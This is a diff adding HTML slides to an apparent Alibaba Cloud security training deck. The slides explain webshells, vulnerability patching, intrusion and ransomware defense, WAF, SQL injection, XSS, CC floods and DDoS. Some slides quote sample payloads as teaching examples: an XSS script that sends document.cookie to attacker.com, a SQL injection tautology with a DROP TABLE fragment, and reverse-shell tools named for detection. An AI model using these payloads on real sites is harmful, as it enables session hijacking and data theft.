+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/host-webshell-attack.png" alt="Webshell Attack Lifecycle and Command Control" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">Webshell Infiltration Flow: Web File Upload Exploit -> Script Dropper -> Remote C2 Control</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-amber">
+            <h3>The Webshell Threat Lifecycle</h3>
+            <ul>
+              <li><strong>Step 1: Exploitation:</strong> Attackers exploit arbitrary file upload flaws, SQL injection into files (INTO OUTFILE), or remote code execution (RCE).</li>
+              <li><strong>Step 2: Script Planting:</strong> Malicious server-side scripts (PHP, JSP, ASPX) are written into web directories.</li>
+              <li><strong>Step 3: Execution &amp; C2:</strong> The attacker accesses the planted script over HTTP to execute arbitrary OS commands, exfiltrate data, and pivot across the VPC.</li>
+            </ul>
+          </div>
+
+          <div class="content-card highlight-green">
+            <h3>Security Center Dynamic Detection</h3>
+            <ul>
+              <li><strong>Beyond Static Signatures:</strong> Obfuscated and encrypted webshells bypass simple string pattern matchers.</li>
+              <li><strong>Dynamic Process Lineage:</strong> Detects abnormal parent-child relationships (e.g. web server <code>php-fpm</code> spawning <code>/bin/bash</code> or <code>curl</code>).</li>
+              <li><strong>Automated Quarantine:</strong> Instantly isolates malicious script files and terminates associated shell processes.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 18: VULNERABILITY MANAGEMENT & PATCHING -->
+    <section class="slide" data-category="Host &amp; Workload Protection">
+      <div class="slide-category">Section 3: Host &amp; Workload Protection</div>
+      <h2>Vulnerability Scanning &amp; Automated Patching</h2>
+      
+      <div class="grid-2" style="margin-top: 0.75rem;">
+        <div class="content-card highlight-blue">
+          <h3>Multi-Vector Vulnerability Scanners</h3>
+          <p>Security Center scans instances against comprehensive vulnerability intelligence databases:</p>
+          <ul>
+            <li><strong>Linux Software Vulnerabilities:</strong> Scans system packages (RPM, DEB) for published Common Vulnerabilities and Exposures (CVEs) in OpenSSL, sudo, glibc, etc.</li>
+            <li><strong>Windows Security Updates:</strong> Identifies missing Windows Server cumulative rollups and remote execution flaws.</li>
+            <li><strong>Web-CMS Vulnerabilities:</strong> Detects flaws in popular application frameworks including WordPress, Discuz!, ThinkPHP, and Apache Struts.</li>
+            <li><strong>Emergency 0-Day Advisories:</strong> Alibaba Cloud threat researchers rapidly push detection signatures within hours of global vulnerability disclosures.</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-green">
+          <h3>Safe &amp; Automated Remediation</h3>
+          <p>Enterprise vulnerability patching engineered to prevent production service disruption:</p>
+          <ul>
+            <li><strong>Pre-Patch Snapshot Safety Net:</strong> Automatically generates an instantaneous ECS disk snapshot prior to applying any system updates, ensuring 1-click rollback.</li>
+            <li><strong>Live Kernel Hotpatching:</strong> Applies critical security fixes to the running operating system kernel without requiring instance reboots.</li>
+            <li><strong>Staged Batch Rollout:</strong> Orchestrates staggered updates across server fleets to maintain service availability during maintenance windows.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 19: SECURITY BASELINE INSPECTION -->
+    <section class="slide" data-category="Host &amp; Workload Protection">
+      <div class="slide-category">Section 3: Host &amp; Workload Protection</div>
+      <h2>Host Baseline Auditing &amp; Hardening</h2>
+      
+      <div class="grid-2" style="margin-top: 0.75rem;">
+        <div class="content-card highlight">
+          <h3>Standardized Security Benchmarks</h3>
+          <p>Continuous compliance inspection aligned with CIS (Center for Internet Security) standards:</p>
+          <ul>
+            <li><strong>Weak Password Detection:</strong> Flags operating system accounts, database users, and service passwords vulnerable to dictionary attacks.</li>
+            <li><strong>Unnecessary Services &amp; Ports:</strong> Identifies unneeded daemons (e.g. Telnet, FTP, rlogin) listening on public network interfaces.</li>
+            <li><strong>SSH Hardening Audits:</strong> Detects insecure SSH configurations, including root login enabled over SSH, empty passwords permitted, or obsolete cipher suites.</li>
+            <li><strong>Access Permission Verification:</strong> Audits sensitive file system permissions on <code>/etc/passwd</code>, <code>/etc/shadow</code>, and web configuration files.</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-blue">
+          <h3>Automated Remediation &amp; Reports</h3>
+          <ul>
+            <li><strong>One-Click Hardening:</strong> Apply standardized security baselines across hundreds of servers simultaneously via automated scripts.</li>
+            <li><strong>Compliance Gap Analysis:</strong> Generates executive audit reports demonstrating alignment with China MLPS Level 3, ISO 27001, and SOC 2 requirements.</li>
+            <li><strong>Drift Detection:</strong> Alerts administrators immediately when unauthorized configuration modifications deviate from the approved baseline.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 20: INTRUSION DETECTION & RANSOMWARE DEFENSE -->
+    <section class="slide" data-category="Host &amp; Workload Protection">
+      <div class="slide-category">Section 3: Host &amp; Workload Protection</div>
+      <h2>Intrusion Detection &amp; Ransomware Defense</h2>
+      
+      <div class="grid-2" style="margin-top: 0.75rem;">
+        <div class="content-card highlight-amber">
+          <h3>Real-Time Intrusion Interception</h3>
+          <ul>
+            <li><strong>Brute-Force Attack Blocking:</strong> Detects repetitive SSH, RDP, and MySQL authentication failures; automatically blocks offending source IPs at the host kernel firewall.</li>
+            <li><strong>Malicious Process Neutralization:</strong> Immediately terminates unauthorized cryptocurrency miners, DDoS botnet agents, and unauthorized port scanners.</li>
+            <li><strong>Reverse Shell Detection:</strong> Flags outbound TCP connections spawned from standard system utilities (e.g. <code>nc</code>, <code>bash -i</code>, <code>python</code>) attempting to reach external C2 servers.</li>
+            <li><strong>Account Anomaly Tracking:</strong> Alerts on unexpected logins from unusual geographic locations, atypical login times, or privileged account creation.</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-green">
+          <h3>Anti-Ransomware Safeguards</h3>
+          <ul>
+            <li><strong>File Integrity Monitoring (FIM):</strong> Kernel-level surveillance tracking mass file modification and rapid extension renaming typical of ransomware encryption routines.</li>
+            <li><strong>Automated Emergency Snapshots:</strong> Triggers instantaneous disk snapshots upon detecting suspicious mass file operations, safeguarding unencrypted data.</li>
+            <li><strong>Anti-Ransomware Vault:</strong> Isolated backup vault with immutable recovery points to guarantee business continuity without paying extortion ransoms.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 21: SECURITY CENTER EDITION MATRIX -->
+    <section class="slide" data-category="Host &amp; Workload Protection">
+      <div class="slide-category">Section 3: Host &amp; Workload Protection</div>
+      <h2>Security Center Edition Feature Matrix</h2>
+      
+      <div class="table-wrapper" style="margin-top: 0.5rem;">
+        <table class="slide-table">
+          <thead>
+            <tr>
+              <th>Security Capability</th>
+              <th>Basic (Free)</th>
+              <th>Advanced</th>
+              <th>Enterprise</th>
+              <th>Ultimate</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Trojan &amp; Virus Detection</strong></td>
+              <td>✔ Core Scans</td>
+              <td>✔ Real-time</td>
+              <td>✔ Real-time AI</td>
+              <td>✔ Real-time AI</td>
+            </tr>
+            <tr>
+              <td><strong>Vulnerability Detection (CVE)</strong></td>
+              <td>✔ Scan Only</td>
+              <td>✔ Scan &amp; Fix</td>
+              <td>✔ Scan, Fix &amp; 0-Day</td>
+              <td>✔ Scan, Fix &amp; 0-Day</td>
+            </tr>
+            <tr>
+              <td><strong>Baseline Compliance Auditing</strong></td>
+              <td>✖</td>
+              <td>✔ Standard</td>
+              <td>✔ CIS &amp; Custom</td>
+              <td>✔ CIS &amp; Custom</td>
+            </tr>
+            <tr>
+              <td><strong>Webshell Dynamic Detection</strong></td>
+              <td>✖</td>
+              <td>✔ Signature</td>
+              <td>✔ Behavioral AI</td>
+              <td>✔ Behavioral AI</td>
+            </tr>
+            <tr>
+              <td><strong>Anti-Ransomware Protection</strong></td>
+              <td>✖</td>
+              <td>✖</td>
+              <td>✔ Automated Snapshots</td>
+              <td>✔ Automated Snapshots</td>
+            </tr>
+            <tr>
+              <td><strong>Container Runtime Defense</strong></td>
+              <td>✖</td>
+              <td>✖</td>
+              <td>✔ K8s / ACK Nodes</td>
+              <td>✔ Full Cloud-Native</td>
+            </tr>
+            <tr>
+              <td><strong>Threat Hunting &amp; Investigation</strong></td>
+              <td>✖</td>
+              <td>✖</td>
+              <td>✖</td>
+              <td>✔ Full Traceability</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout callout-blue" style="margin-top: 0.75rem;">
+        <div>
+          <strong>Architectural Recommendation:</strong> Production e-commerce, banking, and public API workloads should deploy <strong>Enterprise Edition</strong> to enable automated 0-day patch management, behavioral webshell quarantine, and ransomware snapshots.
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 4: WEB APPLICATION FIREWALL (WAF) ==================== -->
+
+    <!-- SLIDE 22: APPLICATION LAYER THREATS -->
+    <section class="slide" data-category="Web Application Firewall (WAF)">
+      <div class="slide-category">Section 4: Web Application Firewall (WAF)</div>
+      <h2>Layer 7 Threats vs. Network Firewalls</h2>
+      
+      <div class="grid-2" style="margin-top: 0.75rem;">
+        <div class="content-card highlight-amber">
+          <h3>The Limitation of Traditional Firewalls</h3>
+          <p>Traditional network firewalls and Security Groups operate exclusively at Layer 3 and Layer 4:</p>
+          <ul>
+            <li><strong>Blind to HTTP Payloads:</strong> Security groups must allow inbound TCP port 80 (HTTP) and port 443 (HTTPS) for public web traffic to function.</li>
+            <li><strong>Inability to Inspect Content:</strong> Once a TCP handshake is established, Layer 4 firewalls cannot inspect HTTP request headers, query parameters, cookies, or POST bodies.</li>
+            <li><strong>Exploiting Valid Connections:</strong> Application vulnerabilities are executed entirely inside valid, perfectly formed HTTP packets.</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-blue">
+          <h3>The Need for Web Application Firewall (WAF)</h3>
+          <p>Alibaba Cloud WAF acts as an intelligent Layer 7 reverse proxy inspecting application traffic before it reaches origin servers:</p>
+          <ul>
+            <li><strong>Deep Packet Inspection (DPI):</strong> Decodes and analyzes URI paths, JSON payloads, multipart form data, and HTTP headers.</li>
+            <li><strong>OWASP Top 10 Neutralization:</strong> Blocks SQL injection, Cross-Site Scripting (XSS), Local/Remote File Inclusion (LFI/RFI), and OS command execution.</li>
+            <li><strong>Zero-Day Virtual Patching:</strong> Applies instant cloud-side regex and semantic filters to block emerging exploits before developers patch source code.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 23: SQL INJECTION ATTACK & DEFENSE -->
+    <section class="slide" data-category="Web Application Firewall (WAF)">
+      <div class="slide-category">Section 4: Web Application Firewall (WAF)</div>
+      <h2>SQL Injection Attack Mechanics &amp; Defense</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/appsec-sql-injection.png" alt="SQL Injection Attack Mechanics and Query Alteration" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">Manipulating Database Queries via Unsanitized Form Input to Exfiltrate Data</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-amber">
+            <h3>The Vulnerability Anatomy</h3>
+            <ul>
+              <li><strong>Raw String Concatenation:</strong> Vulnerable code constructs dynamic SQL: <code>SELECT * FROM Orders WHERE City = '" + City + "'</code>.</li>
+              <li><strong>Malicious Payload Injection:</strong> An attacker inputs <code>Beijing' OR '1'='1</code>, transforming the query into a tautology that dumps all customer orders.</li>
+              <li><strong>Severe Consequences:</strong> Bypasses authentication, extracts sensitive financial records, or drops database tables via <code>; DROP TABLE...</code>.</li>
+            </ul>
+          </div>
+
+          <div class="content-card highlight-green">
+            <h3>Alibaba Cloud WAF Defense</h3>
+            <ul>
+              <li><strong>Semantic SQL Parsing:</strong> WAF tokenizes the HTTP request into an Abstract Syntax Tree (AST) to evaluate syntax intent rather than simple string matching.</li>
+              <li><strong>Zero False Positives:</strong> Distinguishes legitimate searches containing apostrophes from actual SQL control structure injections.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 24: XSS & CSRF EXPLOITATION -->
+    <section class="slide" data-category="Web Application Firewall (WAF)">
+      <div class="slide-category">Section 4: Web Application Firewall (WAF)</div>
+      <h2>Cross-Site Scripting (XSS) &amp; CSRF Defense</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/appsec-xss-attack.png" alt="XSS Cross-Site Scripting Attack Workflow" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">Reflected &amp; Stored XSS: Injecting Malicious JavaScript to Hijack User Sessions</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-blue">
+            <h3>Cross-Site Scripting (XSS)</h3>
+            <ul>
+              <li><strong>Attack Mechanism:</strong> Attackers inject malicious JavaScript (e.g. <code>&lt;script&gt;fetch('attacker.com?c='+document.cookie)&lt;/script&gt;</code>) into forums or profile fields.</li>
+              <li><strong>Impact:</strong> When victim users view the page, the script executes inside their authenticated browser session, exfiltrating session tokens.</li>
+              <li><strong>WAF Mitigation:</strong> Scans and sanitizes script tags, event handlers (<code>onload</code>, <code>onerror</code>), and base64 payloads.</li>
+            </ul>
+          </div>
+
+          <div class="content-card highlight-green">
+            <h3>Cross-Site Request Forgery (CSRF)</h3>
+            <ul>
+              <li><strong>Attack Mechanism:</strong> Tricks an authenticated user's browser into submitting unauthorized transactions (e.g. bank transfer) to a trusted site.</li>
+              <li><strong>WAF Mitigation:</strong> Verifies Referer/Origin headers and injects anti-CSRF token verification cookies.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 25: CC FLOOD & HTTP DOS -->
+    <section class="slide" data-category="Web Application Firewall (WAF)">
+      <div class="slide-category">Section 4: Web Application Firewall (WAF)</div>
+      <h2>Application Layer DoS: Challenge Collapsar (CC)</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/appsec-cc-flood.png" alt="CC Flood and Application Layer DoS Mechanics" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">Flooding Compute-Heavy URIs to Starve Backend Database and CPU Pools</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-amber">
+            <h3>Why CC Floods Are Devastating</h3>
+            <ul>
+              <li><strong>Low Bandwidth, High Impact:</strong> Unlike volumetric DDoS, a CC attack requires very little bandwidth (e.g. 10 Mbps) to bring down an entire enterprise application.</li>
+              <li><strong>Valid TCP Handshakes:</strong> Attackers establish complete TCP connections, bypassing Layer 4 SYN flood defenses.</li>
+              <li><strong>Resource Exhaustion:</strong> Targets computationally heavy URIs (e.g. multi-table database joins, PDF generators, password hashing endpoints) to exhaust backend worker threads.</li>
+            </ul>
+          </div>
+
+          <div class="content-card highlight-green">
+            <h3>WAF Intelligent CC Mitigation</h3>
+            <ul>
+              <li><strong>Algorithmic Rate Limiting:</strong> Enforces dynamic request thresholds per IP, per session cookie, or per user token.</li>
+              <li><strong>Human-Machine Verification:</strong> Injects transparent JavaScript challenges or interactive slider CAPTCHAs to block automated bot traffic.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 26: WAF DEFENSE ENGINES -->
+    <section class="slide" data-category="Web Application Firewall (WAF)">
+      <div class="slide-category">Section 4: Web Application Firewall (WAF)</div>
+      <h2>Alibaba Cloud WAF Defense Engines</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/waf-defense-architecture.png" alt="WAF Defense Engines and Threat Intelligence Architecture" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">Multi-Tier Inspection: IP Reputation, Semantic AI, Threat Intelligence, and Custom Rules</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-blue">
+            <h3>Synchronous Multi-Engine Pipeline</h3>
+            <ul>
+              <li><strong>IP Reputation Engine:</strong> Instantly evaluates incoming source IPs against global threat lists compiled from across Alibaba Cloud's ecosystem.</li>
+              <li><strong>Semantic Analysis Engine:</strong> Deep natural language and AST parsing of payloads, catching zero-day obfuscations without relying on rigid regex rules.</li>
+              <li><strong>Big Data Threat Intelligence:</strong> Correlates threat telemetry across thousands of enterprise tenants to neutralize active botnet campaigns in real-time.</li>
+            </ul>
+          </div>
+
+          <div class="content-card highlight-green">
+            <h3>Accurate Access Control (ACL)</h3>
+            <ul>
+              <li><strong>Multi-Dimensional Matching:</strong> Define custom rules matching IP CIDR, HTTP Method, URI pattern, User-Agent, Referer, and geographical region.</li>
+              <li><strong>Flexible Action Policies:</strong> Choose between Block, Allow, Rate-Limit, or Challenge (CAPTCHA) based on risk scores.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 27: BOT MANAGEMENT & ANTI-CRAWLER -->
+    <section class="slide" data-category="Web Application Firewall (WAF)">
+      <div class="slide-category">Section 4: Web Application Firewall (WAF)</div>
+      <h2>Bot Management &amp; Anti-Crawler Protection</h2>
+      
+      <div class="grid-2" style="margin-top: 0.75rem;">
+        <div class="content-card highlight-blue">
+          <h3>The Business Threat of Malicious Bots</h3>
+          <p>Automated scrapers inflict severe economic and operational damage across digital enterprises:</p>
+          <ul>
+            <li><strong>Price &amp; Inventory Scraping:</strong> Competitor botnets scrape proprietary pricing algorithms, airline seat inventories, and e-commerce catalogs.</li>
+            <li><strong>Credential Stuffing &amp; Account Takeover (ATO):</strong> Automated tools testing stolen username/password lists against login endpoints.</li>
+            <li><strong>Ticket Scalping &amp; Flash-Sale Hoarding:</strong> Headless browser swarms purchasing limited inventory within milliseconds, locking out genuine consumers.</li>
+            <li><strong>Origin Server Resource Drain:</strong> Aggressive scrapers consuming up to <strong>60%+ of backend compute</strong> and database connections.</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-green">
+          <h3>Advanced Anti-Bot Countermeasures</h3>
+          <p>Alibaba Cloud WAF Bot Management uses multi-layered behavioral verification:</p>
+          <ul>
+            <li><strong>Browser Fingerprinting:</strong> Inspects Canvas, WebGL, audio API, and font rendering signatures to detect headless browsers (Puppeteer, Selenium).</li>
+            <li><strong>Human-Machine Interaction Verification:</strong> Analyzes mouse cursor velocity, keystroke intervals, and touchscreen gyroscope data to verify biological humans.</li>
+            <li><strong>Dynamic Token Injection:</strong> Transparently injects encrypted one-time verification tokens into client responses; requests lacking valid tokens are blocked.</li>
+            <li><strong>Smart Slider CAPTCHA:</strong> Presents friction-free biometric slider puzzles only to suspicious anomalous traffic flows.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 28: WAF DEPLOYMENT & CNAME REDIRECTION -->
+    <section class="slide" data-category="Web Application Firewall (WAF)">
+      <div class="slide-category">Section 4: Web Application Firewall (WAF)</div>
+      <h2>WAF Deployment Topologies &amp; CNAME Redirection</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/waf-cname-redirection.png" alt="WAF CNAME DNS Redirection Deployment Flow" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">CNAME Reverse Proxy Routing: Directing Client DNS Through WAF Inspection Before SLB</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-blue">
+            <h3>CNAME Reverse Proxy Mode</h3>
+            <ul>
+              <li><strong>DNS Redirection:</strong> Update the domain's authoritative DNS CNAME record to point to the dedicated WAF cluster hostname.</li>
+              <li><strong>Traffic Decoupling:</strong> Client traffic routes directly to WAF; WAF strips malicious queries and proxies sanitized traffic to origin SLB/ECS.</li>
+              <li><strong>Multi-Cloud &amp; Hybrid Support:</strong> Protects servers hosted in Alibaba Cloud, third-party clouds, or on-premises datacenters without moving infrastructure.</li>
+            </ul>
+          </div>
+
+          <div class="content-card highlight-green">
+            <h3>Transparent SLB Integration Mode</h3>
+            <ul>
+              <li><strong>Zero DNS Changes:</strong> Attach WAF directly to an internal or Internet-facing SLB instance within the same VPC.</li>
+              <li><strong>Cloud-Native Simplicity:</strong> Enables immediate Layer 7 protection in one click without altering DNS TTLs or domain ownership records.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 5: NETWORK SECURITY & ANTI-DDOS ==================== -->
+
+    <!-- SLIDE 29: DDOS FUNDAMENTALS -->
+    <section class="slide" data-category="Network Security &amp; Anti-DDoS">
+      <div class="slide-category">Section 5: Network Security &amp; Anti-DDoS</div>
+      <h2>DDoS Attack Classification &amp; Vectors</h2>
+      
+      <div class="grid-3" style="margin-top: 0.75rem;">
+        <div class="content-card highlight-amber">
+          <h3>Volumetric Attacks (Layer 3/4)</h3>
+          <p><strong>Goal:</strong> Completely saturate incoming network bandwidth.</p>
+          <ul>
+            <li><strong>UDP Floods:</strong> High-volume packet floods overwhelming router interfaces.</li>
+            <li><strong>ICMP Floods:</strong> Echo request floods consuming uplink capacity.</li>
+            <li><strong>NTP/DNS Amplification:</strong> Reflection attacks multiplying small requests into massive response floods.</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-blue">
+          <h3>Protocol Attacks (Layer 4)</h3>
+          <p><strong>Goal:</strong> Exhaust server and firewall state connection tables.</p>
+          <ul>
+            <li><strong>SYN Floods:</strong> Half-open TCP connection exhaustion filling memory queues.</li>
+            <li><strong>ACK / FIN Floods:</strong> Forcing stateful firewalls to inspect millions of invalid packet states.</li>
+            <li><strong>TearDrop / Smurf:</strong> Exploiting IP fragmentation and broadcast mechanics to crash operating systems.</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-green">
+          <h3>Application Attacks (Layer 7)</h3>
+          <p><strong>Goal:</strong> Overwhelm backend database and web server CPU.</p>
+          <ul>
+            <li><strong>HTTP GET/POST Floods:</strong> High-frequency valid HTTP requests targeting dynamic pages.</li>
+            <li><strong>Slowloris:</strong> Sending incomplete HTTP headers at minimal intervals to keep connections open.</li>
+            <li><strong>Slow POST:</strong> Transmitting POST bodies at 1 byte every few seconds, starving server thread pools.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 30: SYN FLOOD MECHANICS -->
+    <section class="slide" data-category="Network Security &amp; Anti-DDoS">
+      <div class="slide-category">Section 5: Network Security &amp; Anti-DDoS</div>
+      <h2>SYN Flood Mechanics &amp; State Exhaustion</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/ddos-syn-flood-mechanics.png" alt="TCP SYN Flood 3-Way Handshake Attack Mechanics" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">Exhausting Server Half-Open Connection Backlog Queues via Spoofed SYN Floods</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-amber">
+            <h3>Handshake Exploitation Anatomy</h3>
+            <ul>
+              <li><strong>Standard 3-Way Handshake:</strong> Client sends <code>SYN</code> $
+ightarrow$ Server replies <code>SYN-ACK</code> and allocates memory $
+ightarrow$ Client replies <code>ACK</code>.</li>
+              <li><strong>The Attack Exploit:</strong> Attackers send millions of <code>SYN</code> packets per second with forged, non-existent source IP addresses.</li>
+              <li><strong>Backlog Starvation:</strong> The server's <code>SYN_RCVD</code> queue fills completely waiting for ACK timeouts; legitimate client connections are rejected.</li>
+            </ul>
+          </div>
+
+          <div class="content-card highlight-green">
+            <h3>Anti-DDoS Hardware Mitigation</h3>
+            <ul>
+              <li><strong>SYN Cookie Generation:</strong> Encodes connection state into the Initial Sequence Number (ISN); avoids allocating server memory until final ACK is verified.</li>
+              <li><strong>TCP Proxy Handshake Verification:</strong> Anti-DDoS hardware acts as a transparent proxy, validating the full 3-way handshake before forwarding clean connections to origin.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 31: ANTI-DDOS BASIC -->
+    <section class="slide" data-category="Network Security &amp; Anti-DDoS">
+      <div class="slide-category">Section 5: Network Security &amp; Anti-DDoS</div>
+      <h2>Anti-DDoS Basic: Zero-Cost Native Defense</h2>
+      
+      <div class="grid-2" style="margin-top: 0.75rem;">
+        <div class="content-card highlight-blue">
+          <h3>Always-On Native Cloud Protection</h3>
+          <p>Alibaba Cloud provides default, zero-configuration baseline protection for every public cloud resource:</p>
+          <ul>
+            <li><strong>Automatic Provisioning:</strong> Enabled by default across all Public IP addresses allocated to ECS, SLB, Elastic IP (EIP), and NAT Gateways.</li>
+            <li><strong>100% Free of Charge:</strong> Zero licensing fees, zero bandwidth subscription costs, and zero configuration steps required.</li>
+            <li><strong>Baseline Mitigation Capacity:</strong> Automatically filters up to <strong>5 Gbps</strong> of volumetric attack traffic per IP (threshold varies by cloud region).</li>
+            <li><strong>Automated Traffic Scrubbing:</strong> Diverts anomalous Layer 4 traffic to regional scrubbing nodes and passes clean packets transparently to backends.</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-amber">
+          <h3>The Threshold Boundary &amp; Blackhole Trigger</h3>
+          <p>Understanding the operational boundary between Basic protection and premium services:</p>
+          <ul>
+            <li><strong>Defense Threshold Ceiling:</strong> When volumetric attacks exceed the allocated Basic threshold (e.g. &gt;5 Gbps), <strong>Blackhole Routing</strong> is automatically triggered.</li>
+            <li><strong>Infrastructure Self-Protection:</strong> The carrier null-routes traffic to the targeted IP to safeguard shared datacenter backbones and adjacent tenant workloads.</li>
+            <li><strong>Service Unavailability:</strong> During blackholing, all traffic to the victim IP is dropped at upstream telecommunication routers, causing downtime.</li>
+            <li><strong>Enterprise Path:</strong> Workloads with strict revenue SLAs must deploy Anti-DDoS Pro or Premium to maintain availability during large-scale attacks.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 32: ANTI-DDOS PRO -->
+    <section class="slide" data-category="Network Security &amp; Anti-DDoS">
+      <div class="slide-category">Section 5: Network Security &amp; Anti-DDoS</div>
+      <h2>Anti-DDoS Pro: Mainland China Protection</h2>
+      
+      <div class="grid-2" style="margin-top: 0.75rem;">
+        <div class="content-card highlight-blue">
+          <h3>Terabit-Scale BGP Scrubbing Centers</h3>
+          <p>Anti-DDoS Pro provides enterprise-grade volumetric defense tailored for workloads operating inside Mainland China:</p>
+          <ul>
+            <li><strong>Custom Multi-Carrier BGP Lines:</strong> Integrates dedicated high-bandwidth BGP connectivity spanning China Telecom, China Unicom, China Mobile, and regional ISPs.</li>
+            <li><strong>Terabit Scrubbing Capacity:</strong> Massive mitigation bandwidth exceeding <strong>1.5+ Tbps per dedicated scrubbing center</strong>, neutralizing world-record attack volumes.</li>
+            <li><strong>Exclusive Dedicated IP Allocation:</strong> Allocates dedicated high-defense IP addresses shielded from public IP sharing risks.</li>
+            <li><strong>Origin Cloaking:</strong> Obscures origin ECS and SLB IP addresses behind the defense perimeter; direct attacks against origin are rendered impossible.</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-green">
+          <h3>Elastic Burst Protection Architecture</h3>
+          <p>Financial flexibility combining baseline predictability with automated burst safety:</p>
+          <ul>
+            <li><strong>Base Protection Bandwidth:</strong> Fixed, cost-predictable monthly subscription covering standard expected attack volumes (e.g. 30 Gbps to 100 Gbps).</li>
+            <li><strong>Elastic Burst Protection:</strong> Automatically scales mitigation limits on-demand to absorb sudden massive spikes without triggering blackholes.</li>
+            <li><strong>Pay-as-You-Go Burst Billing:</strong> You pay strictly for burst bandwidth on days when actual attack volumes exceed the base package; calm days incur zero extra fees.</li>
+            <li><strong>99.95% Availability SLA:</strong> Contractually backed business continuity guarantee supported by dedicated 24/7 Alibaba Cloud security response teams.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 33: ANTI-DDOS PREMIUM -->
+    <section class="slide" data-category="Network Security &amp; Anti-DDoS">
